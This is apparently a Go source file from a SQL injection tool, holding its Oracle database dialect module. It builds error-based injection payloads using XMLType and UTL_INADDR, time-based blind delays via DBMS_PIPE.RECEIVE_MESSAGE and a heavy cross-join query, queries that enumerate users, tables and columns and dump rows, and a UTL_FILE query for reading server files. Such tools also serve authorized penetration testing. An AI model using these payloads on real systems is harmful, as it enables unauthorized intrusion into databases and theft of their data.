package dbms

import (
	"fmt"
	"strings"
)

// Oracle implements DBMS for Oracle Database.
// Key Oracle SQL differences from MySQL/PostgreSQL:
//   - String concatenation uses ||
//   - SUBSTR (not SUBSTRING), LENGTH (shared with PostgreSQL)
//   - No SLEEP(); uses heavyweight query (DBMS_PIPE.RECEIVE_MESSAGE) for delays
//   - ROWNUM for pagination instead of LIMIT/OFFSET
//   - Dual table for expression evaluation (SELECT 1 FROM DUAL)
//   - Error-based: CTxSys.DRITHSX.SN / XMLType type conversion errors
//   - CHR() instead of CHAR()
type Oracle struct{}

func (o *Oracle) Name() string { return "Oracle" }

func (o *Oracle) Concatenate(parts ...string) string {
	return strings.Join(parts, "||")
}

func (o *Oracle) Substring(expr string, start, length int) string {
	return fmt.Sprintf("SUBSTR(%s,%d,%d)", expr, start, length)
}

func (o *Oracle) Length(expr string) string {
	return fmt.Sprintf("LENGTH(%s)", expr)
}

func (o *Oracle) ASCII(expr string) string {
	return fmt.Sprintf("ASCII(%s)", expr)
}

func (o *Oracle) Char(code int) string {
	return fmt.Sprintf("CHR(%d)", code)
}

func (o *Oracle) VersionQuery() string {
	return "SELECT banner FROM v$version WHERE rownum=1"
}

func (o *Oracle) CurrentUserQuery() string {
	return "USER"
}

func (o *Oracle) CurrentDBQuery() string {
	return "ORA_DATABASE_NAME"
}

func (o *Oracle) HostnameQuery() string {
	return "UTL_INADDR.GET_HOST_NAME"
}

func (o *Oracle) ListDatabasesQuery() string {
	// Oracle uses "schemas" rather than databases; list all non-system users
	return "SELECT username FROM all_users ORDER BY username"
}

func (o *Oracle) ListTablesQuery(schema string) string {
	if schema == "" {
		return "SELECT table_name FROM user_tables ORDER BY table_name"
	}
	return fmt.Sprintf(
		"SELECT table_name FROM all_tables WHERE owner='%s' ORDER BY table_name",
		strings.ToUpper(schema),
	)
}

func (o *Oracle) ListColumnsQuery(schema, table string) string {
	if schema == "" {
		return fmt.Sprintf(
			"SELECT column_name FROM user_tab_columns WHERE table_name='%s' ORDER BY column_id",
			strings.ToUpper(table),
		)
	}
	return fmt.Sprintf(
		"SELECT column_name FROM all_tab_columns WHERE owner='%s' AND table_name='%s' ORDER BY column_id",
		strings.ToUpper(schema), strings.ToUpper(table),
	)
}

func (o *Oracle) CountRowsQuery(schema, table string) string {
	if schema == "" {
		return fmt.Sprintf("SELECT COUNT(*) FROM %s", table)
	}
	return fmt.Sprintf("SELECT COUNT(*) FROM %s.%s", schema, table)
}

func (o *Oracle) DumpQuery(schema, table string, columns []string, offset, limit int) string {
	cols := strings.Join(columns, ",")
	qualified := table
	if schema != "" {
		qualified = schema + "." + table
	}
	// Oracle uses ROWNUM; wrap in subquery for offset + limit
	return fmt.Sprintf(
		"SELECT %s FROM (SELECT t.*,ROWNUM rn FROM %s t WHERE ROWNUM<=%d) WHERE rn>%d",
		cols, qualified, offset+limit, offset,
	)
}

func (o *Oracle) ErrorPayloads() []PayloadTemplate {
	return []PayloadTemplate{
		{
			Name:     "xmltype",
			Template: "XMLType('<x>'||({{.Query}})||'</x>')",
			DBMS:     "Oracle",
		},
		{
			Name:     "utl_inaddr",
			Template: "UTL_INADDR.GET_HOST_ADDRESS(({{.Query}}))",
			DBMS:     "Oracle",
		},
	}
}

// SleepFunction returns an Oracle heavyweight-query approximation for delay.
// Oracle does not have a simple SLEEP() equivalent accessible without privileges.
// DBMS_PIPE.RECEIVE_MESSAGE requires appropriate grants; fall back to heavy query.
func (o *Oracle) SleepFunction(seconds int) string {
	// This is a best-effort approximation; real WAITFOR requires DBMS_LOCK grants.
	return fmt.Sprintf(
		"DBMS_PIPE.RECEIVE_MESSAGE(CHR(95)||CHR(95)||CHR(95),%d)",
		seconds,
	)
}

func (o *Oracle) HeavyQuery() string {
	return "SELECT COUNT(*) FROM all_objects A, all_objects B, all_objects C"
}

func (o *Oracle) IfThenElse(condition, trueExpr, falseExpr string) string {
	return fmt.Sprintf("CASE WHEN %s THEN %s ELSE %s END", condition, trueExpr, falseExpr)
}

func (o *Oracle) QuoteString(s string) string {
	return "'" + strings.ReplaceAll(s, "'", "''") + "'"
}

func (o *Oracle) CommentSequence() string {
	return "-- "
}

func (o *Oracle) InlineComment() string {
	return "/**/"
}

func (o *Oracle) FileReadQuery(path string) string {
	// Requires UTL_FILE privilege
	return fmt.Sprintf(
		"SELECT UTL_RAW.CAST_TO_VARCHAR2(UTL_FILE.GET_RAW(UTL_FILE.FOPEN('%s','r'),32767)) FROM DUAL",
		path,
	)
}

func (o *Oracle) Capabilities() Capabilities {
	return Capabilities{
		StackedQueries: false, // Oracle does not support stacked queries via semicolon
		ErrorBased:     true,
		UnionBased:     true,
		FileRead:       false, // Requires special privilege
		FileWrite:      false,
		OSCommand:      false,
		OutOfBand:      false,
		Subqueries:     true,
		CaseWhen:       true,
		LimitOffset:    false, // Oracle uses ROWNUM instead
	}
}
